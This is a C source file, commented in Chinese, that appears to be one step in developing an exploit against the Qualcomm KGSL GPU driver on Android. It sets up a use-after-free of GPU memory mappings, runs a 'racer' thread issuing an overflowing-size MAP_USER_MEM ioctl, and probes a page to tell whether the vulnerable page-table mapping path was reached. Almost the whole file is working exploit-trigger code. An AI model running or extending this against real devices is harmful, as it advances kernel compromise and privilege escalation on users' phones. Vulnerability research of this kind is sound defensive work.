/*
 * k3_discrim.c — 判定 OVERLAP 的 rbtree 插入是否成功（区分两种 ENOMEM）
 *
 * 背景：OVERLAP mmap 失败时 errno 恒为 ENOMEM，但来源有两个：
 *   (a) kgsl_iommu_set_svm_region 检出与 UAF 冲突 → 根本没走到 map_sg（未命中）
 *   (b) 插入成功，进入 kgsl_mmu_map → arm_lpae_map_sg 命中已有 PTE → 失败（已命中漏洞路径）
 *
 * 判据：OVERLAP = [0x7001fe000, 0x700205000)，UAF = [0x7001ff000, 0x710203000)。
 *   两者唯一的非重叠部分是 **首 4 KB：[0x7001fe000, 0x7001ff000)**。
 *   在该页上再发一次 MAP_USER_MEM：
 *     - 返回 0        → 该页空闲 → OVERLAP 节点不存在 → 情况 (a)，未命中
 *     - 返回 -ENOMEM  → 该页已被 OVERLAP 节点占用 → 情况 (b)，已进入漏洞路径
 *
 * 全程无并发、无 GPU 命令；与已证实安全的 delay=3000µs 路径同构。
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdarg.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

#define KGSL_IOC_TYPE 0x09
#define PAGE 4096
#define LOGPATH "/data/local/tmp/discrim.log"

struct kgsl_map_user_mem {
	int fd;
	unsigned long gpuaddr;
	uint64_t len;
	uint64_t offset;
	unsigned long hostptr;
	int memtype;
	unsigned int flags;
};

struct kgsl_gpuobj_alloc {
	uint64_t size;
	uint64_t flags;
	uint64_t va_len;
	uint64_t mmapsize;
	unsigned int id;
	unsigned int metadata_len;
	uint64_t metadata;
};

#define IOCTL_KGSL_MAP_USER_MEM \
	_IOWR(KGSL_IOC_TYPE, 0x15, struct kgsl_map_user_mem)
#define IOCTL_KGSL_GPUOBJ_ALLOC \
	_IOWR(KGSL_IOC_TYPE, 0x45, struct kgsl_gpuobj_alloc)

#define KGSL_MEMFLAGS_USE_CPU_MAP 0x10000000ULL
#define KGSL_USER_MEM_TYPE_ADDR   0x00000002

#define UAF_START     0x00000007001ff000ULL
#define UAF_SIZE      0x0000000010004000ULL
#define OVERLAP_START 0x00000007001fe000ULL
#define OVERLAP_SIZE  0x0000000000007000ULL
#define PLACEH_START  0x0000000710204000ULL
#define PLACEH_SIZE   0x0000000000010000ULL
#define BOGUS_START   0x0000000700204000ULL
#define WRAP_SIZE     0xffffffffffefd000ULL

/* 探针地址 */
#define PROBE_OVERLAP_ONLY 0x00000007001fe000ULL /* OVERLAP∩¬UAF，唯一可判别页 */
#define PROBE_INSIDE_UAF   0x0000000700200000ULL /* UAF 内部，对照（应恒失败） */

static int fd = -1;
static int logfd = -1;

static double now_us(void)
{
	struct timespec ts;
	clock_gettime(CLOCK_MONOTONIC, &ts);
	return ts.tv_sec * 1e6 + ts.tv_nsec / 1e3;
}

static void lg(const char *fmt, ...)
{
	char buf[300], line[360];
	va_list ap;
	int n;

	va_start(ap, fmt);
	vsnprintf(buf, sizeof(buf), fmt, ap);
	va_end(ap);
	n = snprintf(line, sizeof(line), "[%6.1fms] %s\n", now_us() / 1000.0,
		     buf);
	if (write(1, line, n) < 0) { }
	if (logfd >= 0 && write(logfd, line, n) < 0) { }
}

static void sync_log(void)
{
	if (logfd >= 0)
		fsync(logfd);
}

struct race_state {
	volatile int ready;
	volatile long result;
	volatile int saved_errno;
};

static void *racer(void *arg)
{
	struct race_state *rs = (struct race_state *)arg;
	struct kgsl_map_user_mem req;

	while (!rs->ready)
		__asm__ __volatile__("" ::: "memory");

	memset(&req, 0, sizeof(req));
	req.fd = -1;
	req.len = WRAP_SIZE;
	req.hostptr = BOGUS_START;
	req.memtype = KGSL_USER_MEM_TYPE_ADDR;
	req.flags = KGSL_MEMFLAGS_USE_CPU_MAP;
	errno = 0;
	rs->result = ioctl(fd, IOCTL_KGSL_MAP_USER_MEM, &req);
	rs->saved_errno = errno;
	return NULL;
}

static int svm_probe(uint64_t addr, const char *tag, int *out_errno)
{
	struct kgsl_map_user_mem m;
	void *p;
	int ret, e;
	static int done_uaf_start = 0;
	uint64_t a = addr;

	/* PROBE_INSIDE_UAF 可能与现有 VMA 冲突：先尝试 MAP_FIXED 建页 */
	p = mmap((void *)(uintptr_t)a, PAGE, PROT_READ | PROT_WRITE,
		 MAP_SHARED | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
	if (p == MAP_FAILED) {
		lg("%s: vma FAIL errno=%d (%s)", tag, errno, strerror(errno));
		*out_errno = errno;
		return -1;
	}
	*(volatile char *)p = 1;
	memset(&m, 0, sizeof(m));
	m.fd = -1;
	m.len = PAGE;
	m.hostptr = (unsigned long)(uintptr_t)p;
	m.memtype = KGSL_USER_MEM_TYPE_ADDR;
	m.flags = KGSL_MEMFLAGS_USE_CPU_MAP;
	errno = 0;
	ret = ioctl(fd, IOCTL_KGSL_MAP_USER_MEM, &m);
	e = errno;
	lg("%s: MAP_USER_MEM(0x%llx) → ret=%d errno=%d (%s) out_gpuaddr=0x%lx",
	   tag, (unsigned long long)a, ret, e, strerror(e), m.gpuaddr);
	*out_errno = e;
	(void)done_uaf_start;
	munmap(p, PAGE);
	return ret;
}

int main(void)
{
	unsigned int uaf_id = 0, ov_id = 0, ph_id = 0;
	uint64_t uaf_ms = 0, ov_ms = 0, ph_ms = 0;
	void *p, *bogus, *ph;
	size_t k;
	struct kgsl_gpuobj_alloc al;
	struct race_state rs;
	pthread_t th;
	int e = 0;

	logfd = open(LOGPATH, O_WRONLY | O_CREAT | O_APPEND, 0644);
	lg("===== discrim start pid=%d =====", getpid());
	sync_log();

	fd = open("/dev/kgsl-3d0", O_RDWR | O_CLOEXEC);
	if (fd < 0) {
		lg("open FAIL errno=%d", errno);
		return 1;
	}

	/* UAF */
	memset(&al, 0, sizeof(al));
	al.size = UAF_SIZE;
	al.flags = KGSL_MEMFLAGS_USE_CPU_MAP;
	if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &al)) {
		lg("UAF alloc FAIL errno=%d", errno);
		return 1;
	}
	uaf_id = al.id;
	uaf_ms = al.mmapsize;

	/* OVERLAP */
	memset(&al, 0, sizeof(al));
	al.size = OVERLAP_SIZE;
	al.flags = KGSL_MEMFLAGS_USE_CPU_MAP;
	if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &al)) {
		lg("OVERLAP alloc FAIL errno=%d", errno);
		return 1;
	}
	ov_id = al.id;
	ov_ms = al.mmapsize;

	p = mmap((void *)(uintptr_t)UAF_START, (size_t)uaf_ms,
		 PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED, fd,
		 (off_t)uaf_id << 12);
	if (p == MAP_FAILED) {
		lg("UAF mmap FAIL errno=%d", errno);
		return 1;
	}
	((volatile char *)p)[0] = 1;
	((volatile char *)p)[uaf_ms - PAGE] = 1;
	for (k = 0; k + PAGE < uaf_ms; k += PAGE * 1024)
		((volatile char *)p)[k] = 1;
	munmap(p, (size_t)uaf_ms);
	lg("UAF alloc/mmap/touch/munmap OK (rbtree 条目与 PTE 预期残留)");
	sync_log();

	/* BOGUS VMA */
	bogus = mmap((void *)(uintptr_t)BOGUS_START, PAGE * 3,
		     PROT_READ | PROT_WRITE,
		     MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
	if (bogus == MAP_FAILED) {
		lg("BOGUS mmap FAIL errno=%d", errno);
		return 1;
	}
	for (k = 0; k < 3; k++)
		((volatile char *)bogus)[k * PAGE] = 1;
	lg("BOGUS VMA OK");

	/* PLACEHOLDER */
	memset(&al, 0, sizeof(al));
	al.size = PLACEH_SIZE;
	al.flags = KGSL_MEMFLAGS_USE_CPU_MAP;
	if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &al)) {
		lg("PLACEHOLDER alloc FAIL errno=%d", errno);
		return 1;
	}
	ph_id = al.id;
	ph_ms = al.mmapsize;
	ph = mmap((void *)(uintptr_t)PLACEH_START, (size_t)ph_ms,
		  PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED, fd,
		  (off_t)ph_id << 12);
	if (ph == MAP_FAILED) {
		lg("PLACEHOLDER mmap FAIL errno=%d", errno);
		return 1;
	}
	((volatile char *)ph)[0] = 1;
	lg("PLACEHOLDER OK");

	/* racer（顺序执行：等它返回后再 map，复现 delay=3000µs 的安全时序） */
	memset(&rs, 0, sizeof(rs));
	rs.result = -1;
	if (pthread_create(&th, NULL, racer, &rs)) {
		lg("pthread_create FAIL");
		return 1;
	}
	rs.ready = 1;
	pthread_join(th, NULL);
	lg("racer 返回 ret=%ld errno=%d (BOGUS 节点应已插入, 树已重平衡)",
	   rs.result, rs.saved_errno);
	sync_log();

	/* 主线程 OVERLAP mmap */
	p = mmap((void *)(uintptr_t)OVERLAP_START, (size_t)ov_ms,
		 PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED, fd,
		 (off_t)ov_id << 12);
	e = errno;
	lg("OVERLAP mmap → %s errno=%d (%s)",
	   p == MAP_FAILED ? "FAIL" : "OK", e, strerror(e));
	sync_log();

	/* 判别探针 */
	{
		int e1 = 0, e2 = 0;
		int r1 = svm_probe(PROBE_OVERLAP_ONLY, "probe(OVERLAP∩¬UAF)", &e1);
		int r2 = svm_probe(PROBE_INSIDE_UAF, "probe(inside UAF)", &e2);
		(void)r2;
		lg("---- 判定 ----");
		if (r1 == 0)
			lg("verdict: OVERLAP 节点不存在 → 主线程在 set_svm_region 就失败 → 未命中 (情况 a)");
		else if (e1 == ENOMEM)
			lg("verdict: OVERLAP 节点存在 → 主线程已进入 kgsl_mmu_map/map_sg → 漏洞路径已触及 (情况 b)");
		else
			lg("verdict: 意外值 ret=%d errno=%d (情况 c)", r1, e1);
		lg("control(inside UAF): ret=%d errno=%d （预期 -1/ENOMEM）", r2,
		   e2);
	}
	sync_log();
	lg("===== end =====");
	sync_log();
	close(fd);
	return 0;
}
